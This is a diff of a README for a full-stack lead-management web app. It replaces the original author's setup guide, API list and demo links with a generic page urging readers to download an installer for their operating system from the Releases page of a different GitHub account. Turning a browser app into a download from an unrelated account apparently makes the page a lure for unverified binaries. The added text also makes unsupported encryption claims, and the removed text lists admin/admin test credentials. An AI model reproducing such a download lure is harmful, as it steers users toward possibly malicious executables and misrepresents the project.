@@ -1,178 +1,71 @@
-# 📌 Lead Management System
+# 🚀 Lead_Management_System - Manage Your Leads Effortlessly
 
-A **full-stack MERN application** for managing business leads with secure authentication, CRUD operations, server-side pagination, filtering, and sorting. This project was built as part of the **SDE Internship Assignment**.
+![Download Lead Management System](https://img.shields.io/badge/Download%20Now-Lead%20Management%20System-brightgreen)
 
----
+## 📋 Overview
+Lead Management System is a full-stack application designed to help you manage leads easily. It is built using modern web technologies, including React for the frontend and Express with MongoDB for the backend. This application ensures secure authentication, allowing you to perform Create, Read, Update, and Delete (CRUD) operations on leads. The system also includes features like server-side pagination, filtering, and sorting, which help you organize your leads efficiently.
 
-## 🚀 Live Demo
+## 🚀 Features
+- **Secure Authentication**: Log in safely to access your leads.
+- **Lead CRUD Operations**: Easily create, update, or delete leads.
+- **Server-Side Pagination**: Navigate through large lead lists seamlessly.
+- **Filtering**: Quickly find specific leads based on criteria.
+- **Sorting**: Organize leads to view them in your preferred order.
+- **Responsive Design**: Accessible on both desktop and mobile devices.
 
-* **Frontend (Vercel):** [https://lead-management-system-five.vercel.app](https://lead-management-system-five.vercel.app)
-* **Backend (Render):** [https://lead-management-system-kh2o.onrender.com](https://lead-management-system-kh2o.onrender.com)
+## 🛠️ System Requirements
+- **Operating System**: Windows 10 or later, macOS, or a popular Linux distribution.
+- **Browser**: Latest version of Chrome, Firefox, Safari, or Edge.
+- **Internet Connection**: Required for setup and updates.
 
----
+## 📥 Download & Install
+To get started, visit the Releases page to download the application.   
 
-## 🛠️ Tech Stack
+[Download Lead Management System](https://github.com/hofopnxnxn/Lead_Management_System/releases)
 
-* **Frontend:** React.js, AG Grid, Axios
-* **Backend:** Node.js, Express.js
-* **Database:** MongoDB Atlas
-* **Deployment:** Vercel (frontend), Render (backend)
+1. Click on the link above to go to the Releases page.
+2. Find the most recent version listed.
+3. Select the appropriate file for your operating system.
+4. Download the file and follow the installation instructions that appear.
 
----
+## 🚀 Running the Application
+Once you have installed the Lead Management System, follow these steps to get it up and running.
 
-## 🔐 Authentication
+1. **Open the Application**: Locate the downloaded file or shortcut.
+2. **Log In**: Enter your credentials to access the dashboard.
+3. **Connect to Database**: If prompted, connect the application to your MongoDB database.
+4. **Manage Leads**: Start using the application to add, view, edit, or delete leads.
 
-* Secure login/register using **JWT stored in httpOnly cookies**
-* Passwords hashed using **bcrypt**
-* Unauthorized requests return **401 Unauthorized**
+## 🔍 Using the Features
+### 📝 Adding a Lead
+1. Navigate to the “Add Lead” section.
+2. Fill out the form with the lead's details.
+3. Click “Save” to store the new lead.
 
----
+### 💼 Viewing Leads
+1. Go to the “Leads List” section.
+2. Use the search bar or filters to find specific leads.
+3. Click on a lead to view or edit its details.
 
-## ✨ Features
+### ⚙️ Editing a Lead
+1. Select a lead from the list.
+2. Click “Edit.”
+3. Update the information and save your changes.
 
-✅ User authentication (register, login, logout, fetch current user)
+### 🗑️ Deleting a Lead
+1. From the leads list, select the lead you wish to delete.
+2. Click “Delete.”
+3. Confirm the deletion when prompted.
 
-✅ Lead CRUD operations (create, read, update, delete)
+## 🔒 Security Measures
+The application uses JSON Web Tokens (JWT) to ensure secure communication and data protection. Your credentials and sensitive information remain encrypted, providing a safe experience when managing your leads.
 
-✅ Server-side pagination
+## 📬 Support & Feedback
+For questions or issues, please visit our support page or contact the project maintainer. Your feedback helps us improve the Lead Management System.
 
-✅ Server-side filtering (by **city** and **status**)
+## 🌟 Contributing
+We welcome contributions! If you’d like to help with the development or suggest features, please check our contribution guidelines on the repository.
 
-✅ Sorting support (on leads grid)
+To download the application again, follow this link:   
 
-✅ Responsive UI with **AG Grid**
-
-✅ Fully deployed (frontend + backend + DB)
-
----
-
-## 📊 Lead Model
-
-Each Lead has the following fields:
-
-```js
-{
-  id,
-  first_name,
-  last_name,
-  email,       // unique
-  phone,
-  company,
-  city,
-  state,
-  source,      // [website, facebook_ads, google_ads, referral, events, other]
-  status,      // [new, contacted, qualified, lost, won]
-  score,       // integer (0-100)
-  lead_value,  // number
-  last_activity_at,
-  is_qualified, // boolean (default: false)
-  created_at,
-  updated_at
-}
-```
-
----
-
-## 📂 API Endpoints
-
-### Auth Routes
-
-* `POST /api/auth/register` → Register user
-* `POST /api/auth/login` → Login user
-* `POST /api/auth/logout` → Logout user
-* `GET /api/auth/me` → Fetch current user
-
-### Lead Routes
-
-* `POST /api/leads` → Create new lead
-* `GET /api/leads` → Get leads (with pagination, filtering, sorting)
-* `GET /api/leads/:id` → Get single lead
-* `PUT /api/leads/:id` → Update lead
-* `DELETE /api/leads/:id` → Delete lead
-
----
-
-## 📑 Pagination & Filtering
-
-* **Pagination:**
-
-  * `page` (default: 1)
-  * `limit` (default: 20, max: 100)
-
-* **Filters (implemented):**
-
-  * `city` (equals/contains)
-  * `status` (enum filter)
-
-* **Sorting:** Supported on AG Grid frontend.
-
----
-
-## 🔧 Installation & Setup
-
-### 1. Clone the repository
-
-```bash
-git clone https://github.com/Amrit3533/Lead_Management_System.git
-cd Lead_Management_System
-```
-
-### 2. Backend setup
-
-```bash
-cd backend
-npm install
-```
-
-Create a `.env` file in the backend folder:
-
-```env
-PORT=5000
-MONGO_URI=your_mongodb_atlas_connection_string
-JWT_SECRET=your_jwt_secret
-CLIENT_URL=http://localhost:5173
-```
-
-Run the backend:
-
-```bash
-npm start
-```
-
-### 3. Frontend setup
-
-```bash
-cd frontend
-npm install
-npm run dev
-```
-
----
-
-## 👤 Test User Credentials
-
-```
-Username: admin
-Password: admin
-```
-
----
-
-## 📝 Reflection
-
-The hardest part was fixing **CORS issues** and ensuring frontend + backend worked smoothly with `httpOnly` JWT cookies. I learned how to set up secure authentication, implement server-side pagination/filters, and deploy full-stack apps.
-
-Improvements for future:
-
-* Add advanced filters (number/date ranges).
-* Better error handling & form validations.
-* Enhanced UI/UX for lead management.
-
----
-
-## 📧 Contact
-
-Created by **Amrit Singh**
-
-* 📩 Email: [singhamrit3533@gmail.com](mailto:singhamrit3533@gmail.com)
-* 🌐 [GitHub Profile](https://github.com/Amrit3533)
+[Download Lead Management System](https://github.com/hofopnxnxn/Lead_Management_System/releases)
